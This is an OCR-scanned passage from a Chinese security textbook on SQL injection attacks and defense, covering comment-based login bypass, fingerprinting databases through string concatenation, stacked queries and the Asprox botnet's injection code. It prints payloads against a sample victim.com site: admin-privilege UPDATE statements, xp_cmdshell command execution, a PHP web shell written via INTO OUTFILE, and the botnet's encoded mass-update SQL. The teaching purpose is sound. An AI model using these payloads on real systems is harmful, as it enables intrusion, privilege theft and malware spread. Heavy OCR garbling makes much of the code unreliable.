清除注释后的代码可以更好地说明该例：
54
---
## Page 69
第2章SQL注入测试
SELECT *
FROM administrators
WHERE usernane = 'admin' *';
不难发现，我们需要使用一个字符串来结束该语句，因为应用在最后插入了一个单引号，
这是我们无法控制的。我们选择连接一个空字符串，它不会对查询结果产生任何影响。
上述例子使用空字符串来连接输入。进行SQL注入测试时，总是会用到字符申连接这种
技术。由于在SQL Server、MySQL、Oracle 和 PostgreSQL 中的做法各不相同，因此可将字符
串连接作为识别远程数据库的工具。表2-4列出了各种数据库中的连接运算符。
表2-4数据库的连接运算符
数据库
连接示例
SQL Server
“’ +"b'=ab’
MySQL
b’ ='ab'
Oracle 和I PostgreSQL
“'b'='ab'
如果在Web应用中找到一个易受攻击的参数，但是却无法确定远程数据库，此时便可以
使用字符串连接技术加以识别。可通过使用下列格式的连接符替换易受攻击的字符串参数来识
别远程数据库：
http://www,victim.com/displayuser,aspx?User=Bob -- JG始请求
http://www.victim.com/displayuser.aspx?User=B' + 'ob -- MSsQL Server
http://www,victim.com/displayuser,aspx7User=B' 'ob -- MysQL Server
http:/ /ww. victim.com/displayuser aspx?User=B' I1 * ob -- Oracle 或 PostgreSQL
发送这三个已修改的请求后，您将得到运行在运程后台服务器上的数据库。其中有两个请
求会返回语法错误，剩下的一个将返回与原请求相同的结果，从而指明远程使用的数据库。
表2-5总结了在使用数据库注释绕过身份验证机制时经常使用的一些特征值。
表2-5使用数据库注释时常用的特征值
测试字符串
变种
预期结果
_admin'--
admin"--
通过返回数据库中的admin行集来绕过身份验证机制
MySQL通过返回数据库中的admin行集来绕过身份验
adminf
admin)w
证机制
 1-
1)-
注释剩下的查询，希望能够清除可注入参数后面由
WHERE子句指定的所有过滤器
1 or 1=1-
1) or 11--
注入一个数字参数，返回所有行
'or'If
2) or ''=1'-*
注入一个字符申参数，返回所有行
-1 and 12-
-1) and 12
注入一个数字参数，不返回任何行
Z=1, pue,
) and '1=′2'
注入一个字符串参数，不返回任何行
/+娃/I
将注入注释掉。如果成功，将不会对原请求产生任何
影响。这有助于识别SQL注入漏润
55
---
## Page 70
SQL注入攻击与防御（第2版）
3.执行多条语句
终止SQL语句进一步提高了您对发送给数据库服务器的SQL代码的控制权。实际上，这
种控制并不仅仅局限于由数据库创建的语句。如果终止了一条SQL语句，那么您就可以创建
一条全新的没有限制的语句。
SQLServer6.0在其架构中引I入了服务端游标，从而允许在同一连接句柄上执行包含多条
语句的字符串。所有6.0之后的SQLServer版本均支持该功能且允许执行下列语句：
SELECT foo FROM bar; SELECT foo2 FROM bar2;
客户端连接到SQLServer并依次执行每条语句，数据库服务器向客户端返回每条语句发送
的结果集。
MySQL在4.1及之后的版本中也引入了该功能，但它在默认情况下并不支持该功能。
Oracle不支持多条语句，除非使用PL/SQL。
要利用该技术，您首先需要能够终止第一条语句，这样您之后才可以连接任意的SQL代码。
可通过很多方式利用这一概念，第一个例子将针对一个连接SQLServer数据库的应用。我
们可使用多条语句来提升用户在应用中的权限，例如，将我们的用户添加到管理员组。我们的
目标是运行一条如下所示的UPDATE语句：
UPDATEuSers/*更新表用户/
SETisadmin=1/*在应用程序中添加管理员权限*/
WHERE uid= /* to your user */
需要使用前面介绍的HAVING1-I和GROUPBY技术来枚举列名，以此来发动攻击：
http://www.victim,com/welcome. aspx?user=45; select * from usershaving
--f=
这将返回一个错误，其中包含第一列的名称。可通过将列名添加到GROUPBY子句来重
复该操作：
http://vww.victim,com/welcome.aspx?user=45;select * from users having
http://vww.victim,com/velcome.aspx?user-45:select * from users having
1-1GRO0P BY uid; =-
1=1GROUP BY uid, user;-*
http://www.victim,com/welcome.aspx?user=45;select * from users having
1=1GROUP BY uid, user, password; --
1=1GROUP BY uid, user, password, 1sadmin;--
找到需要的列名后，接下来将管理员权限添加至Victim公司的Web应用中，包含该注入
代码的URL如下所示：
http://www victim.com/welcome.aspx?uid=45;UPDATE users SET isadmin=]
WHERE uid=45; --
警告：
通过执行UPDATE语句来提升权限时需要特别小心，一定要在末尾添加WHERE子旬。
不要执行类似下面的内容：
http://www.victim.com/welcome.aspx?uid=45; UPDATE users SET isadmin=1
上述语司将更新user表中的所有记录，这不是我们想做的事情。
56
---
## Page 71
第2章SQL注入测试
当存在执行任意SQL代码的可能性时，通常会有很多攻击方式，我们可以增加一个新用户：
INSERT INTO administrators (usernane, password)
其主要思想是根据不同的应用程序来执行相应的语句。但是如果执行SELECT语句，那么
将无法得到所有的查询结果，因为Web服务器只读取第一个记录集。稍后将介绍如何使用
UNION语句向现有的结果中添加数据。此外，我们还拥有与操作系统进行交互的能力（假设数
据库用户拥有足够的权限），比如读取或写人文件、执行操作系统命令。第6章将详细介绍这
种攻击，下面是一个典型的使用多条语句的例子：
http:/ /www, victim,com/welcome , aspx?uid=45;exec master. ,xp_cmdshe11
*ping www.google,com'/ --
在MySQL数据库中可以利用类似的技术来执行多条语句（假如启用了多条语句功能)，其
技术和功能与前面的几乎完全相同。我们将终止第一个查询并在第二个查询中执行任意代码。
本例中第二条语句采用的代码如下所示：
SELECT '
该SQL语句将字符申输出至/var/www/victim.com
shell.php文件中。写入到文件中的字符串是个脚本，它能够检索名为cmd的GET参数的值并
在一个操作系统shell中加以执行。执行该攻击的URL如下所示：
http:/ /www,victim.com/search.php7s=test*;SELECT *' INTO OUTFILE */var/www/victim. com/she11 .
php′ /="
那么上述命令会在Web目录下创建一个允许执行任何命令的文件：
http: / /ww. victim. com/she1l .php?cmd=1s
第6章将介绍更多利用这种问题的知识。就目前而言，最重要的是学习这一概念和获得在
多条语句中执行任意SQL代码的机会。
表2-6列出了用于注入多条语句的特征值。
表2-6用于注入多条语句的特征值
测试字符串
变种
预期结果
:[SQL Statement];-
:[SQL Statement];-
注入一个字符申参数，执行多条语句
MySQL—注入一个字符串参数，执行多条语句
:[SQL Statement];#
s[SQL Statement];#
（如果数据库支持的话）
:[SQL Statement];--
):[SQL Stastement];-
注入一个数值参数，执行多条语句
:[SQL Statement];#
):[SQL Statement];#
MySQL—注入一个数值参数，执行多条语句
（如果数据库支持的话）
57
---
## Page 72
SQL注入攻击与防御（第2版）
秘密手记
AsproxBotnet使用的SQL注入
户网络（botnet）是一种由受传染计算机组成的大型网络，一般被犯罪者和有组织
的犯罪集团用来发动钓鱼攻击（phishingattack)、发送垃圾邮件或发动分布式拒绝服务
(Denial of Service，DoS）攻击
新感染的计算机会变成由主服务器控制的债户网络的一部分，存在多种传染模式，
最需见的是利用Web浏览器漏洞，在这种情况下，受害者打开一个由恶意Web站点提
供的Web页面，其中包含一个针对受害者浏览器的攻击（cxploit).如果该攻击代码被
成功执行，那么受害者的计算机将被传染，
正是由于采用这样一种传染方法，我们不难想象，僵户网络拥有者会一直通过寻
找目标Web站点来提供恶意软件。
之前设计AsproxTrojan的主要目的是创建一个垃圾邮件债户网络，专门负责发送
钓鱼邮件，但2008年5月份期间，僵户网络中所有受传染的系统均收到一个更新过的
组件，它位于名为msscntr32.exe的文件中，该文件是一个SQL注入攻击工具，作为系
统服务安装在“Microsoft SecurityCenter Extension”下.
一旦该服务运行，它就会使用Google搜索引学并通过识别运行带GET参数的.asp
页面的主机来寻找潜在受害者，受传染代码会终止当前的语句，并像本章前面介绍的
那祥添加一条新语句。我们看一下受传染的URL：
http://wmrw.victim,com/vulnerable,asp?id=425;DECLARE @S
VARCHAR (4000) :SET 8S=CAST (0x4445434C4152452040542056415243
434C415245202075F437572736F72 AS
VARCHAR(4000));EXEC(eS);-- [shortened for brevity]
下面是执行攻击的未编码代码和注释代码：
DECLARE
8T VARCHAR(255),/* variable to store the table name */
8C VARCHAR(255)/*variable to store the column name */
DECLARE Table_Cursor CURSOR
/*declares a DB cursor that will contain */
FOR/* all the table/column pairs for all the */
SELECT a.name,b.name/* user created tables and */
FROM sysobjectsa, syscolumns b
/* columns typed text(35), ntext (99), varchaz(167) */
/*orsysname(231)*/
WHERE a.id=b.id AND a.xtype=*u* AND (b.xtype=99 OR b.xtype=35 OR
b.xtype=231
OR b.xtype=167)
OPEN Table_Cursor /*Opens the cursor */
FETCH NEXT FROM Table_CurSor INTO eT, 8C
/* Fetches the first result */
58
---
## Page 73
第2章SQL注入测试
WHILE(eeFETCB_STATUs-O) /* Enters in a loop for every row*/BEGIN
EXEC(*UPDATE [′+@T+*]SET
/*Updates every column and appends */
.
"'*`)
/*javascript file */
FETCH NEXT FROM Tab1e_Cursor INTO eT,@C
/*Fetches next result */
END
CLOSE Table_Cursor /* Closes the cursor */
DEALLoCATE Table_Cursor/* Deallocates the cursor */
上述代码通过添加一个标记来更新数据库的内容，如果在Web页面上显示
更新后的任何内容（可能性很大），访客将会把该JavaScript文件的内容下载到浏览器中。
该攻击的目的是危害Web服务器并通过修改合法的HTML代码来包含一个
JavaScript文件，该文件含有感染更多易受攻击电脑和继续扩大僵户网络所必需的代码。